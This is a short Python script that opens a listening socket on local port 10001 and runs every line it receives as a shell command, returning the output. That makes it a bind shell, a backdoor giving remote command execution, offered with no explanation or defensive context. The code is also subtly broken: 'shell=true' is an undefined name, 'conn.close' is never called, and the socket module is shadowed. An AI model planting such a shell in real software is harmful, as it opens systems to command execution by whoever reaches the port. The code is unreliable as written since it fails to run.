#!/usr/bin/python
import socket
import subprocess

socket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.bind(('127.0.0.1', 10001))
socket.listen(1)
while True:
    conn, _ = socket.accept()
    while True:
        data = conn.recv(1024)
        if not data:
            break
        data = data.rstrip()
        output = subprocess.check_output(data, shell=true)
        conn.sendall(output)
        conn.close
        break
